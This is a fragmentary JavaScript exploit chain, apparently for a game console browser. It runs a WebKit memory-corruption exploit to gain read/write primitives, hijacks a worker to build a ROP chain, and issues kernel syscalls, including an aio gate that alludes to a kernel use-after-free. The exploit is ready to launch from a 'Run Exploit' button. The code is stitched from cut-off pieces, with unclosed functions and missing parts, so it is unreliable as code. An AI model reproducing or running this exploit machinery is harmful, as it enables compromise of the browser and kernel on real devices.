function classify(raw) {
    if (!(raw instanceof int64)) return { s32: 0, failed: true };
    const lo = raw.low | 0;
    const carry = (raw.hi >>> 0) === 0xFFFFFFFF ? 1 : 0;
    return { s32: lo, failed: carry === 1 && lo < 0 };

const ERRNO_NAMES = {
    1: "EPERM", 2: "ENOENT", 3: "ESRCH", 9: "EBADF", 12: "ENOMEM",
    13: "EACCES", 14: "EFAULT", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN",

    if (!res.failed) return "ok";
    const n = (-res.s32) >>> 0;

const WATCHDOG_MS = 15000;
async function watchdog(promise, what) {
    let timer = null;
    try {
        return await Promise.race([
            promise,
            new Promise((_, rej) => {
                timer = setTimeout(() => rej(new Error("WATCHDOG: " + what)), WATCHDOG_MS);
            })
        ]);
    } finally {
        if (timer !== null) clearTimeout(timer);
    }
}

async function sys(num, a, b, c, d, e, f) {
    if (chainDead) throw new Error("sys: chain dead");
    const hasStub = P.syscalls[num] !== undefined;
    if (!hasStub)
        throw new Error("sys: 0x" + num.toString(16) + " has no libkernel stub (raw path removed with 727)");
    syscallCount++;
    state.syscallsIssued.add(num);
    const callPromise = hasStub
        ? chain.syscall(num, a, b, c, d, e, f)
        : chain.raw_syscall(num, a, b, c, d, e, f);
    const raw = await watchdog(callPromise, "syscall 0x" + num.toString(16));
    const cl = classify(raw);
    return { raw, s32: cl.s32, failed: cl.failed,
        hex: "0x" + raw.toString(), errText: errText({ s32: cl.s32, failed: cl.failed }) };
}

async function aioGate() {
    // PSAITO aio_reach F0 ABI check: zeros-only calls, never fires the UAF.
    const checks = [
        ["aio_init(0)", SYS_AIO_INIT, [0, 0, 0]],
        ["aio_submit(0,0,0)", SYS_AIO_SUBMIT, [0, 0, 0]],
        ["aio_multi_wait(0,0,0,mode0,0)", SYS_AIO_MULTI_WAIT, [0, 0, 0, 0, 0]],

            const r = await sys(c[1], c[2][0], c[2][1], c[2][2], c[2][3], c[2][4]);

            p = globalThis.p;
        } else {
            log("running WebKit exploit...", "step");

            try { history.replaceState(null, ""); } catch (e) { }
            if (typeof globalThis.gc === "function") {
                try { globalThis.gc(); } catch (e) { }
            }
            await new Promise(r => setTimeout(r, 750));

            log("webkit attempt cap: " + __maxAttempts + " (?max=N — lower it to reduce memory burn per session)", "info");
            let carrier = await establishPrimitive({
                maxAttempts: __maxAttempts,
                onEvent(tag, detail, attempt) {
                    if (tag === "ATTEMPT-START")
                        log("exploit attempt " + attempt, "step");
                    else
                        log("[" + tag + "] " + detail, "info");
                }
            });

            installWindowP(carrier, { onEvent: queueEvent });

            if (typeof globalThis.gc === "function") {
                try { globalThis.gc(); } catch (e) { }
            }
            await new Promise(r => setTimeout(r, 1000));

            if (!pairStatus.promoted)
                throw new Error("pair was NOT promoted (" +
                    pairStatus.error + ")");

            p = globalThis.p;
            if (!p || typeof p.read8 !== "function")
                throw new Error("window.p was never published");

            log("primitive up: attempts=" + carrier.attempts +
                " paired=" + pairStatus.promoted, "step");

            // The addrof carrier is large and is only needed to promote the
            // primitive. Drop the page-level reference before kernel stages
            // allocate their own buffers and kernel objects.
            carrier = null;
            try { history.replaceState(null, ""); } catch (e) { }
            if (typeof globalThis.gc === "function") {
                try { globalThis.gc(); } catch (e) { }
            }
            await new Promise(r => setTimeout(r, 1000));
            log("released WebKit carrier; settled memory before kernel stage", "info");
        }

        log("prepare(): module bases, gadget/syscall tables, worker hijack...", "step");
        const prepared = await prepare(p);
        P = prepared.p;
        chain = prepared.chain;

        log("ROP chain ready, verifying with getpid()...", "step");
        const pidRaw = await chain.syscall(SYS_GETPID);
        const pid = classify(pidRaw);
        log("getpid() = " + pid.s32, "step");

        if (pid.s32 <= 0) {
            setStatus("ROP chain verification failed", "fail");
            return;
        }

        log("chain operational, pid=" + pid.s32 +
            " gadgets=" + Object.keys(P.gadgets).length +
            " syscalls=" + Object.keys(P.syscalls).length, "step");
        try { await psNotify("Bagagwa: WebKit OK pid=" + pid.s32); } catch(e) {}
        setStatus("ready — press Run Exploit", "");
        btnEl.disabled = false;

    } catch (err) {
        log("init error: " + (err.stack || err.message || err), "err");
        setStatus("initialization failed: " + (err.message || err), "fail");
    }
}

        log("[chain] STOP: call window.__bagagwaChainStop() to halt at the next boundary", "info");
